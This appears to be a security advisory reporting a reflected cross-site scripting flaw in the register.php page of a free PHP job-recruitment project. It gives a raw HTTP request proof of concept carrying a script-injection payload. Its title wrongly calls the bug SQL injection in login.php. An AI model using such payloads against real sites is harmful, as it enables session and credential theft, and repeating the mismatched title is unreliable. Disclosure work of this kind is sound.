# Job-recruitment-in-php has sql injection vulnerability in login.php  

## supplier
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
register.php
## describe
There is an  Cross Site Scripting vulnerability in Job_Recruitment systtem in register.php,  Control parameter: **$e**

A malicious attacker can use this vulnerability to obtain administrator login credentials or phishing websites

![image-20241111084241861](https://github.com/user-attachments/assets/c02f3773-2a88-47d4-a0db-ea2714f9f1eb)

## code analysis

The **$_POST['e']** parameters of the register.php are not filtered and concatenated into the $userstring1,and echo $userstring1 value is not filtered.

![image-20241111084553469](https://github.com/user-attachments/assets/67da9d26-968d-4100-a7ed-468088eda82f)

## POC

```
POST /register.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Contnet-Length: 10
Connection: close
Cookie: PHPSESSID=apdbj581m83cio8cj275e494dr
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 42

e=<script>alert(1);</script>&p1=123456
```

![image-20241111084811671](https://github.com/user-attachments/assets/8faa8708-c7a4-47c2-b691-286ba5b5336a)

**Result**

it can excute the Cross Site Scripting : alert(1);

![image-20241111084857613](https://github.com/user-attachments/assets/24681cd7-86d1-45ef-881a-ef612b17225b)

**Discover**

西安电子科技大学 李腾，谢亚轩